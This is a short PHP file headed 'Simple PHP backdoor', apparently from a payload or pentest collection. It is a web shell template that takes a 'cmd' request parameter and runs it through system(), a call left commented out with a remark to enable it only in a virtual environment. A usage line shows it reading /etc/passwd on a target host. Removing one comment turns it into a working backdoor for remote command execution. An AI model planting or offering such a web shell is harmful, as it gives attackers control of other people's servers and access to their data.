<!-- Simple PHP backdoor -->

<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    // Only uncomment in a virtual environment
    // system($cmd);
    echo "</pre>";
    die;
}
?>

Usage: http://target.com/remoteFileInclusion.php?cmd=cat+/etc/passwd